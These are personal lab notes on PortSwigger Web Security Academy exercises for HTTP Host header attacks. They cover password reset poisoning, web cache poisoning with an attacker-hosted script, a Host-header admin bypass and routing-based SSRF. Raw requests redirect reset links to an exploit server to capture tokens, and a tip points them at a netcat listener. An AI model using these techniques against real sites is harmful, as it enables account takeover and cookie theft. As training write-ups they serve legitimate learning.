all technique that Portswigger teach us, read [here](https://portswigger.net/web-security/host-header/exploiting)

# Password reset poisoning
## general
Note the email is sent to you even tho we changed the `Host header` to point to somewhere else. The plan is we will change host name to a malicious site or the site that we have a control of. The easies way to do this is user the exploit server that the Lab offers.


I then changed host header to `<original>.com/exploit/` and set it to myself. When I click on it I will send a GET request to the server. On the Access log, I can see that there was a incoming request for `/exploit/forgot-password?temp-forgot-password-token=<token here>`


The goal is change the host header to `<original>.com/exploit/` and change `user=carlos`. Carlos will click on the email and we will then be able to see it on the access log. we will the copy the token and use it to reset carlos password!


Note: If we do ctf, just point it to our `ip:port` and run `nc` listen to that port

## via middleware
```
POST /forgot-password HTTP/1.1
Host: acef1f6f1f685ced80bd5a0d008b0020.web-security-academy.net
X-Forwarded-Host: accd1fba1fc55c3180755a7501740032.web-security-academy.net/exploit
```
same as last task but we cannot use the same trick. This time we are using `X-Forwarded-Host`. How this I find out? just trying out the techniques that PortSwigger mentioned before.. So now when we know that is work by trying on our own account. change `user=carlos` -> check access log for token `/forgot-password?temp-forgot-password-token=wSoizV4lQdJDO84TTnBa6V6cj610GiIT`. Visit it and reset Carlos password!

## via dangling markup
```html
     <script>
            window.addEventListener('DOMContentLoaded', () => {
                for (let el of document.getElementsByClassName('dirty-body')) {
                    el.innerHTML = DOMPurify.sanitize(el.getAttribute('data-dirty'));
                }
            });
        </script>
```

```
POST /forgot-password HTTP/1.1
Host: ac051fe31fa115bd809f1db800380059.web-security-academy.net:'<a href="//ace31ff61f66157680481d3c01e4005d.web-security-academy.net/exploit/
```

```html
<p>Hello!</p><p>Please <a href='https://ac051fe31fa115bd809f1db800380059.web-security-academy.net:'<a href="//ace31ff61f66157680481d3c01e4005d.web-security-academy.net/exploit/?/login'>click here</a> to login with your new password: pUFVxOIq1g</p><p>Thanks,<br/>Support team</p><i>This email has been scanned by the MacCarthy Email Security service</i>
```

no way, I logged into the server with carlos but wasn't done taking note, and do more experiment.... can we redo the lab?

# web cache poisoning
I read in guideline on the PortSwigger, It is not to hard to understand how it works but I learn more when I listen so I youtube a bit on how web cache poisoning works. I couldn't make the extension works so I just try to add different header and end up with `HOST`
```
GET / HTTP/1.1
Host: ac971f5a1fb39ab7807d059500930022.web-security-academy.net
Host: kuro.net
```
an it seem like it works. line 19 in http response
```html
       <script type="text/javascript" src="//kuro.net/resources/js/tracking.js">
```
I try to inject a malicious js code `" <script> alert(document.cookie) </script>` but it didn't work. it end up like this
```html
<script type="text/javascript" src="//" 
    <script> alert(document.cookie) </script>
    /resources/js/tracking.js">
</script>
```
and ofc it didnt work, we even mess up the web. So I was thinking that what if I crate a server which `kurohat.net/resources/js/tracking.js` with the content `alert(document.cookie)` then it should works since the web page will load my malicious page on ``kurohat.net/resources/js/tracking.js`


Instead of using our own website, we can use exploit server that the lab offering instead. create a page `/resources/js/tracking.js` with content `alert(document.cookie)` then click *store*. now copy the link and insert it as our 2nd `host` header. Use repeater to send our request util you get response with `Age: 0`. Try to visit the page, If you get an alert then we are good!!


# Host header authentication bypass
```
This lab makes an assumption about the privilege level of the user based on the HTTP Host header.

To solve the lab, access the admin panel and delete Carlos's account. 
```
I assume that the admin page is at `/admin` and luckily I got it right! I send it to *Repeater* I tried to add like `X-Forwarded-For`/ `X-Forwarded-Host: localhost`. but it didnt work. I the just remove the original `host` parameter and replace it with localhost and boom, it work!! Now open it on web browser and click delete Carlos's account -> send it to *burp* and again replace the original host with localhost

# Routing-based SSRF
```
This lab is vulnerable to routing-based SSRF via the Host header. You can exploit this to access an insecure intranet admin panel located on an internal IP address.

To solve the lab, access the internal admin panel located in the 192.168.0.0/24 range, then delete Carlos
```
to create payload, run
```zsh
$ python3 -c "for i in range (0,256): print(i);" > subnet.txt
```
I tried, you need Burp PRO (Burp Collaborator) to solve this!

# SSRF via flawed request parsing
Also need, Burp PRO (Burp Collaborator)